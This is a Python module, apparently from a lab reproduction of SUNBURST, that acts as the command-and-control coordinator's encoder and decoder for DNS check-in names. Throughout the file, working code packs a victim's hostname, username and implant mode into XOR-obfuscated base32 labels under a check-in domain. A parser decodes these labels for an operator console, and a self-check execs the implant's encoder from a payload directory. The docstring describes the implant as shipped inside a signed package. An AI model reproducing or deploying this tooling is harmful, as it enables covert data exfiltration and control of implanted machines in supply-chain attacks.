"""SUNBURST-style encoded check-in names.

The implant builds a check-in name from the host it runs on.  The leftmost
label carries an encoded record so the coordinator can decide whether to
answer, and so a defender who can read the label learns which host called
home.

Wire format (all integers big-endian):

    byte  0        format version (1)
    byte  1        implant mode: 4 passive, 5 active, 3 disabled
    bytes 2..5     victim uid: first 4 bytes of sha256(hostname|username)
    byte  6        hostname length (1..16)
    ...            hostname, ASCII, lowercased
    byte  n        username length (1..10)
    ...            username, ASCII, lowercased
    bytes n+2..    CRC-16/CCITT over every preceding byte

The record is XORed with a fixed keystream and base32 encoded, lowercase and
without padding.  A fixed key is what SUNBURST did and it is what makes the
names recoverable offline; the checksum rejects names the implant did not
build.  Limit the assembled record to 39 bytes so one label holds it (63
characters max) and the name stays inside one UDP question.

This module is the coordinator's encoder and decoder.  The implant ships its
own copy because it lives inside the signed package; ``python3 dga.py``
compares both implementations on random inputs.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import json
import random
import string
import sys
from pathlib import Path

FORMAT_VERSION = 1
MODE_DISABLED = 3
MODE_PASSIVE = 4
MODE_ACTIVE = 5
MODE_NAMES = {MODE_DISABLED: "disabled", MODE_PASSIVE: "passive", MODE_ACTIVE: "active"}

CHECKIN_SUFFIX = "checkin.orion-lab.test"
KEY_MATERIAL = b"orion-improvement-program/v1"
MAX_HOSTNAME = 16
MAX_USERNAME = 10
MAX_RECORD = 39

_B32 = set(string.ascii_lowercase + "234567")


def _keystream(size: int) -> bytes:
    digest = hashlib.sha256(KEY_MATERIAL).digest()
    return (digest * (size // len(digest) + 1))[:size]


def _xor(value: bytes) -> bytes:
    return bytes(left ^ right for left, right in zip(value, _keystream(len(value))))


def _person(user: str | None = None) -> str:
    if user:
        return user
    import getpass
    import os

    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USER", "unknown")


def _uid(hostname: str, username: str) -> bytes:
    return hashlib.sha256(f"{hostname.lower()}|{username.lower()}".encode("utf-8")).digest()[:4]


def _fit(value: str, limit: int, fallback: str) -> str:
    cleaned = "".join(character for character in value.lower() if character.isalnum() or character in "-.").strip("-.")
    if not cleaned:
        cleaned = fallback
    return cleaned[:limit]


def _record(hostname: str, username: str, mode: int) -> bytes:
    if mode not in MODE_NAMES:
        raise ValueError(f"unknown mode {mode}")
    host = _fit(hostname, MAX_HOSTNAME, "host")
    user = _fit(username, MAX_USERNAME, "user")
    body = (
        bytes([FORMAT_VERSION, mode])
        + _uid(host, user)
        + bytes([len(host)])
        + host.encode("ascii")
        + bytes([len(user)])
        + user.encode("ascii")
    )
    checksum = binascii.crc_hqx(body, 0x1021).to_bytes(2, "big")
    record = body + checksum
    if len(record) > MAX_RECORD:
        raise ValueError(f"encoded record is {len(record)} bytes, limit is {MAX_RECORD}")
    return record


def encode_label(hostname: str, username: str, mode: int = MODE_PASSIVE) -> str:
    """Return the leftmost DNS label for one check-in."""
    return base64.b32encode(_xor(_record(hostname, username, mode))).decode("ascii").rstrip("=").lower()


def build_query(hostname: str, username: str, mode: int = MODE_PASSIVE, suffix: str = CHECKIN_SUFFIX) -> str:
    return f"{encode_label(hostname, username, mode)}.{suffix}"


def looks_encoded(label: str) -> bool:
    """Cheap pre-filter a sensor can run on every query it sees."""
    return 32 <= len(label) <= 63 and set(label) <= _B32


def decode_label(label: str) -> dict[str, object]:
    """Decode one label.  Raises ValueError with the failing check."""
    if not 8 <= len(label) <= 63:
        raise ValueError("label length outside the encoded range")
    if set(label) > _B32:
        raise ValueError("label contains characters outside the base32 alphabet")
    padded = label.upper() + "=" * (-len(label) % 8)
    try:
        record = _xor(base64.b32decode(padded, casefold=True))
    except (binascii.Error, ValueError) as exc:
        raise ValueError(f"label is not valid base32: {exc}") from exc
    if len(record) < 9:
        raise ValueError("decoded record is too short")
    version, mode = record[0], record[1]
    if version != FORMAT_VERSION:
        raise ValueError(f"unsupported record version {version}")
    if mode not in MODE_NAMES:
        raise ValueError(f"unknown mode byte {mode}")
    uid = record[2:6]
    offset = 6
    host_length = record[offset]
    offset += 1
    if not 1 <= host_length <= MAX_HOSTNAME or offset + host_length + 1 > len(record):
        raise ValueError("hostname field is malformed")
    hostname = record[offset : offset + host_length].decode("ascii", errors="replace")
    offset += host_length
    user_length = record[offset]
    offset += 1
    if not 1 <= user_length <= MAX_USERNAME or offset + user_length + 2 > len(record):
        raise ValueError("username field is malformed")
    username = record[offset : offset + user_length].decode("ascii", errors="replace")
    offset += user_length
    checksum = int.from_bytes(record[offset : offset + 2], "big")
    expected = binascii.crc_hqx(record[:offset], 0x1021)
    if checksum != expected:
        raise ValueError("checksum mismatch")
    if offset + 2 != len(record):
        raise ValueError("trailing bytes after checksum")
    if uid != _uid(hostname, username):
        raise ValueError("victim uid does not match the encoded identity")
    return {
        "label": label,
        "format_version": version,
        "mode": mode,
        "mode_name": MODE_NAMES[mode],
        "uid": uid.hex(),
        "hostname": hostname,
        "username": username,
        "checksum": f"{checksum:04x}",
        "record_bytes": len(record),
    }


def split_query(name: str, suffix: str = CHECKIN_SUFFIX) -> str | None:
    """Return the encoded label when ``name`` belongs to the check-in suffix."""
    name = name.rstrip(".").lower()
    if name == suffix:
        return None
    if not name.endswith("." + suffix):
        return None
    label = name[: -(len(suffix) + 1)]
    return label if label and "." not in label else None


def parse_query(name: str, suffix: str = CHECKIN_SUFFIX) -> dict[str, object] | None:
    """Decode a full query name, or return None when it is not a check-in."""
    label = split_query(name, suffix)
    if label is None:
        return None
    try:
        return decode_label(label)
    except ValueError as exc:
        return {"label": label, "error": str(exc), "decode_ok": False}


def explain(result: dict[str, object]) -> list[tuple[str, str]]:
    """Field-by-field breakdown for the operator console."""
    if "error" in result:
        return [("label", str(result["label"])), ("error", str(result["error"]))]
    return [
        ("label", str(result["label"])),
        ("format", str(result["format_version"])),
        ("mode", f"{result['mode']} ({result['mode_name']})"),
        ("victim uid", str(result["uid"])),
        ("hostname", str(result["hostname"])),
        ("username", str(result["username"])),
        ("crc16", str(result["checksum"])),
    ]


def _implant_module():
    """Import the implant's own encoder for the parity check."""
    here = Path(__file__).resolve()
    for candidate in (
        here.parents[1] / "pipeline" / "payload" / "dga_implant.py",
        here.parents[1] / "pipeline" / "payload" / "orion_support.py",
    ):
        if candidate.exists():
            source = candidate.read_text(encoding="utf-8")
            namespace: dict[str, object] = {"__name__": "dga_implant"}
            exec(compile(source, str(candidate), "exec"), namespace)
            return namespace, candidate
    return None, None


def _selfcheck() -> int:
    module, path = _implant_module()
    if module is None:
        print("implant encoder not built yet; skipping parity check")
        return 0
    encoder = next(
        (module[name] for name in ("encode_label", "build_label", "label") if callable(module.get(name))),
        None,
    )
    if encoder is None:
        print(f"{path}: no encoder function found (expected encode_label)")
        return 1
    alphabet = string.ascii_lowercase + string.digits + "-._"
    for _ in range(200):
        host = "".join(random.choice(alphabet) for _ in range(random.randint(3, 20)))
        user = "".join(random.choice(alphabet) for _ in range(random.randint(1, 12)))
        mode = random.choice([MODE_PASSIVE, MODE_ACTIVE, MODE_DISABLED])
        mine = encode_label(host, user, mode)
        theirs = encoder(host, user, mode)
        if mine != theirs:
            print(f"mismatch host={host!r} user={user!r} mode={mode}: {mine} != {theirs}")
            return 1
        decoded = decode_label(mine)
        if decoded["hostname"] != _fit(host, MAX_HOSTNAME, "host"):
            print(f"round trip failed for {host!r}")
            return 1
    print(f"parity ok against {path}: 200 random identities")
    return 0


if __name__ == "__main__":
    sys.exit(_selfcheck())
